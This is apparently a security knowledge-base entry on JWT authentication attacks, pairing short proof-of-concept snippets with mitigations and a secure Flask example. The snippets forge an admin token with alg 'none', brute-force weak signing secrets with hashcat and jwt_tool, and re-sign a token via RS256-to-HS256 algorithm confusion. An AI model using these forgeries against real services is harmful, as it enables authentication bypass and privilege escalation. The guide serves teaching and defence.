# JWT Authentication Attacks

## Overview

JSON Web Tokens (JWT) are widely used for authentication and authorization in modern web applications. However, improper implementation can lead to serious security vulnerabilities including authentication bypass, privilege escalation, and information disclosure.

**Severity**: High to Critical  
**OWASP Top 10**: A07:2021 - Identification and Authentication Failures  
**CWE**: CWE-287

## Technical Explanation

JWT consists of three parts: Header, Payload, and Signature, separated by dots. Common vulnerabilities include:
- Algorithm confusion (alg: none, RS256 to HS256)
- Weak signing keys
- Missing signature verification
- Sensitive data in payload
- Token expiration issues

## Attack Scenario

An attacker modifies a JWT to change their user role from "user" to "admin" by exploiting weak signature verification.

## Proof of Concept

### 1. Algorithm None Attack

```python
import base64
import json

# Original JWT
header = {"alg": "none", "typ": "JWT"}
payload = {"user": "attacker", "role": "admin"}

# Encode
header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')

# Create token without signature
malicious_jwt = f"{header_b64}.{payload_b64}."
```

### 2. Weak Secret Brute Force

```bash
# Using hashcat
hashcat -a 0 -m 16500 jwt.txt wordlist.txt

# Using jwt_tool
python3 jwt_tool.py <JWT> -C -d secrets.txt
```

### 3. Algorithm Confusion (RS256 to HS256)

```python
# Server uses RS256 (asymmetric)
# Attacker changes to HS256 (symmetric) and signs with public key

import jwt

public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----"""

payload = {"user": "attacker", "role": "admin"}

# Sign with public key using HS256
malicious_token = jwt.encode(payload, public_key, algorithm='HS256')
```

## Impact

- Authentication Bypass
- Privilege Escalation
- Account Takeover
- Information Disclosure
- Session Hijacking

## Mitigation

### 1. Strong Secret Keys

```python
import secrets

# Generate strong secret
JWT_SECRET = secrets.token_urlsafe(64)

# Use environment variables
import os
JWT_SECRET = os.environ.get('JWT_SECRET')
if not JWT_SECRET or len(JWT_SECRET) < 32:
    raise ValueError("JWT_SECRET must be at least 32 characters")
```

### 2. Proper Signature Verification

```python
import jwt
from jwt.exceptions import InvalidTokenError

def verify_token(token):
    try:
        payload = jwt.decode(
            token,
            JWT_SECRET,
            algorithms=['HS256'],  # Explicitly specify allowed algorithms
            options={
                'verify_signature': True,
                'verify_exp': True,
                'verify_nbf': True,
                'verify_iat': True,
                'require_exp': True
            }
        )
        return payload
    except InvalidTokenError:
        raise ValueError("Invalid token")
```

### 3. Short Expiration Times

```python
from datetime import datetime, timedelta
import jwt

def create_token(user_id, role):
    payload = {
        'user_id': user_id,
        'role': role,
        'exp': datetime.utcnow() + timedelta(minutes=15),
        'iat': datetime.utcnow(),
        'nbf': datetime.utcnow()
    }
    return jwt.encode(payload, JWT_SECRET, algorithm='HS256')
```

### 4. Token Revocation

```python
# Store revoked tokens in Redis
import redis

redis_client = redis.Redis(host='localhost', port=6379, db=0)

def revoke_token(token):
    payload = jwt.decode(token, JWT_SECRET, algorithms=['HS256'])
    exp = payload['exp']
    ttl = exp - int(datetime.utcnow().timestamp())
    redis_client.setex(f"revoked:{token}", ttl, "1")

def is_token_revoked(token):
    return redis_client.exists(f"revoked:{token}")
```

## Secure Code Example

```python
from flask import Flask, request, jsonify
import jwt
from datetime import datetime, timedelta
from functools import wraps
import os

app = Flask(__name__)
JWT_SECRET = os.environ.get('JWT_SECRET')
JWT_ALGORITHM = 'HS256'

def create_access_token(user_id, role):
    payload = {
        'user_id': user_id,
        'role': role,
        'exp': datetime.utcnow() + timedelta(minutes=15),
        'iat': datetime.utcnow(),
        'type': 'access'
    }
    return jwt.encode(payload, JWT_SECRET, algorithm=JWT_ALGORITHM)

def require_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get('Authorization', '').replace('Bearer ', '')
        
        try:
            payload = jwt.decode(
                token,
                JWT_SECRET,
                algorithms=[JWT_ALGORITHM],
                options={'require_exp': True}
            )
            request.user = payload
            return f(*args, **kwargs)
        except jwt.ExpiredSignatureError:
            return jsonify({'error': 'Token expired'}), 401
        except jwt.InvalidTokenError:
            return jsonify({'error': 'Invalid token'}), 401
    
    return decorated

@app.route('/protected')
@require_auth
def protected():
    return jsonify({'user': request.user})
```

## Security Takeaways

1. Use strong, random secret keys (64+ characters)
2. Explicitly specify allowed algorithms
3. Always verify signatures
4. Implement short expiration times
5. Use refresh tokens for long sessions
6. Never store sensitive data in JWT payload
7. Implement token revocation
8. Use HTTPS only
9. Set secure cookie flags for JWT cookies
10. Regular security audits

## References

- [JWT.io](https://jwt.io/)
- [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [CWE-287: Improper Authentication](https://cwe.mitre.org/data/definitions/287.html)
